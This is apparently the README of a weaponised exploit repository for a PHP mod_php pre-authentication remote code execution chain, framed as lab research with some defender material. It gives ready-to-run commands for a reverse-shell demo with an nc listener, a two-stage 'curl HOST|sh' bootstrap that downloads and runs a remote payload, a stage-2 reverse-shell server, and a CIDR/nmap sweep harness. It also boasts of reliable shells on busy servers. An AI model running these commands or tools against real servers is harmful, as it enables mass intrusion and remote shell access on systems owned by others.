# php2shell

Pre-auth RCE research for **CVE-2026-109618 / CVE-2026-109619** ("php2shell"), the
PHP `session.upload_progress` OOM + UAF chain. Apache mod_php (prefork),
PHP 8.3–8.5. Built on the public chain from alvarodh5 / dinosn / 9bie; the
contribution here is making it work **deterministically on busy multi-worker
servers**, **against stock configuration**, and **across the Docker build matrix**.

> Lab research. Everything measured against local `php:*-apache` containers we
> control. See `SECURITY.md` for authorized-use notice and defender pointers.

## What this adds over the public PoCs

- **Deterministic multi-worker exploitation.** Keep-alive pinning + shared-ASLR
  spray. The public PoCs assume one prefork worker; this one measured 100% across
  all tested load patterns on 25-worker labs including saturation.
- **Adaptive OOM sizing.** `probe_oom` ramps the OOM field from 8 MB until it
  trips, so the chain works across `memory_limit` 8M–256M without a hardcoded
  size. Also fixes 8.3.35's load-fragility (prior fixed size tripped OOM too
  early for grooming).
- **2-stage `curl HOST|sh` bootstrap.** Operational solve for the 14-byte cap;
  no public PoC documents it. Short attacker domain in ≤6 chars lets a
  13-byte bootstrap fetch an arbitrary-length stage 2 over HTTP.
- **Honest reach measurement.** `output_buffering = 4096` (every distro
  default I tested) behaviorally hardens against this chain regardless of PHP
  version. Five client-side bypasses tested; none reached threshold. See
  `DISTRO_EXPLOITABILITY.md`.
- **5-layer patch cross-check** against the 8.3.36 source diff. Any one of
  layers 1–3 alone kills the chain. Shipped as `PATCH_CROSSCHECK.md` for
  backport auditing.
- **Operator calibration tool.** `extract_offsets.py` pulls `zif_system` and
  `zval_ptr_dtor` from any `libphp.so` / `php-fpm` binary via a
  `zend_function_entry` scan. One command, handles both direct-byte builds
  (Docker, Sury) and R_X86_64_RELATIVE relocation builds (Rocky Remi PIE).
- **Offset-table fix.** Found a 0x2b0-byte bug in previously-circulated Sury
  PPA offsets that would have crashed workers rather than calling `system()`.
  Measured correct values for Rocky Remi 8.3.35 / 8.4.26 / 8.5.11 and
  Sury 8.3.35 / 8.4.26.
- **Dynamic `htdata` derivation.** When no profile offset exists for the
  target minor, the exploit derives `htdata` from the leak itself (verified
  constants for 8.3/8.4/8.5 series). Unlocks future minors in a known series
  without manual pre-calibration.
- **`--probe-only` behavioral probe.** Catches backport-patched builds that
  still report a vulnerable version string (RHEL/Debian/Ubuntu often backport
  fixes without bumping versions).
- **Novel layer-4 primitive.** First empirical confirmation of
  `BG(unserialize).data` cross-request dangling after OOM mid-`__wakeup`,
  reproducing 10/10 on 8.3.35. Not RCE on default config; parse-time write
  mechanism mapped end-to-end as crash primitive + conditional RCE path.
  See `research.md`.
- **FPM Chain-E port.** Correct arm flow (two-SID, in-band GET arm). Status
  matches dinosn's own writeup: mechanism + DoS proven, RCE unproven.

## Reach

| Target | Status |
|---|---|
| Docker `php:*-apache` 8.3.22–8.3.35, 8.4.0–8.4.26, 8.5.0–8.5.11 | **Exploitable** out of the box |
| Docker `php:*-apache` <8.3.22 | Not exploitable (heap-layout shift at 8.3.22; grooming would need a port) |
| Docker `php:*-apache` ≥8.3.36 / ≥8.4.27 / ≥8.5.12 | Patched |
| Distro mod_php (Rocky Remi, Ubuntu Sury, Debian apt) | **Behaviorally hardened by default.** `output_buffering = 4096` blocks the Stage 1 leak regardless of version. See [`DISTRO_EXPLOITABILITY.md`](DISTRO_EXPLOITABILITY.md). |
| php-fpm | Vulnerable in principle; needs its own grooming. "Chain-E" port in-tree: mechanism proven, RCE not. |

The exploit is reliable: 43/43 end-to-end on 8.4.26 and 39/39 on 8.3.35 across
load patterns from idle to saturating (30 attacker threads > 25 Apache workers),
direct and through an nginx reverse proxy. Time-to-shell is typically 1–5 s.
See [`research.md`](research.md) for measurements.

## Quick start

Fresh-container reverse shell demo (`php:8.4.26-apache`, ~20 s to interactive
shell as `www-data`):

```
# in one pane:
nc -l -p 4444

# in another:
./pocs/php2shell/demo.sh
```

Direct exploit against a known target:

```
python3 pocs/php2shell/php2shell.py \
    -u http://TARGET/ \
    -c 'id>/tmp/x'                 # ≤14 bytes

# or arbitrary payload via 2-stage bootstrap:
python3 pocs/php2shell/serve_stage2.py --revshell YOUR_IP:4444 --port 80 &
python3 pocs/php2shell/php2shell.py -u http://TARGET/ --stage2 your-short-host
```

Vulnerability probe (no exploitation):

```
python3 pocs/php2shell/php2shell.py -u http://TARGET/ --probe-only
```

Defender audit of own binaries:

```
python3 pocs/php2shell/extract_offsets.py /path/to/libphp.so
```

## Honest limits (read before relying on this tool)

- **mod_php prefork only.** PHP-FPM is a separate exploit chain (parked, see
  `research.md` § "php-fpm feasibility").
- **`display_errors` must be On.** Stock Docker ships no php.ini so the compile
  default applies. Hardened hosts set it Off, which kills the Stage 1 leak.
- **`output_buffering = 0` is required.** Docker's default. Distro installs ship
  `output_buffering = 4096` and are behaviorally hardened regardless of PHP
  version. Five client-side bypass attempts documented in `research.md`; none
  reached the 4 KB threshold.
- **Grooming floor is 8.3.22.** Heap layout shifted there; pre-8.3.22 needs a
  different grooming geometry (open work, not in-tree).
- **Full RCE needs a per-version offset (`htdata`).** Shipped: 8.3.35, 8.4.26,
  8.5.11. The *leak* (ASLR bypass) is version-general; only the Stage 3 reclaim
  is per-version. `extract_offsets.py` recovers `zif_system` + `zval_ptr_dtor`
  from any build in one command.
- **Command cap: 14 bytes.** Hard limit from the 192-bin reclaim target size.
  `--stage2 <host>` fires `curl HOST|sh` and bootstraps an arbitrary-length
  payload over HTTP. The free `host` field needs ≤ 6 chars.

## Repo map

| Path | Purpose |
|---|---|
| `pocs/php2shell/php2shell.py` | Main exploit driver (mod_php chain + FPM Chain-E port, probe-only, dynamic htdata derivation, 20-thread spray) |
| `pocs/php2shell/extract_offsets.py` | Offset-recovery tool for `libphp.so` / `php-fpm` binaries |
| `pocs/php2shell/php2sweep.py` | Batch harness for scoped CIDR / nmap-XML / list-based probing |
| `pocs/php2shell/serve_stage2.py` | HTTP server for the stage-2 payload (`--revshell` or `--payload`) |
| `pocs/php2shell/stage2.sh` | Reverse-shell payload template |
| `pocs/php2shell/demo.sh` + `demo.ini` | Fresh-container to interactive shell demo |
| `lab/` | Docker-compose + Apache/PHP configs for research reproduction |
| `research.md` | Detailed research notes, measurements, dead ends, novel primitives |
| `NOTES.md` | Engineering notes on upstream PoC lineage |
| `PATCH_CROSSCHECK.md` | Five-layer defense verification against the 8.3.36 source diff |
| `DISTRO_EXPLOITABILITY.md` | Per-distro status, `output_buffering=4096` analysis |
| `CREDITS.md` | Attribution lineage (MIT; see `LICENSE`) |
| `SECURITY.md` | Authorized-use notice + defender pointers |

## Status

The specific pattern this chain exploits has been thoroughly closed in
`8.3.36` / `8.4.27` / `8.5.12`. Five independent defense layers; any one of the
first three alone kills the chain. Backport auditors can use the checklist in
`PATCH_CROSSCHECK.md`.
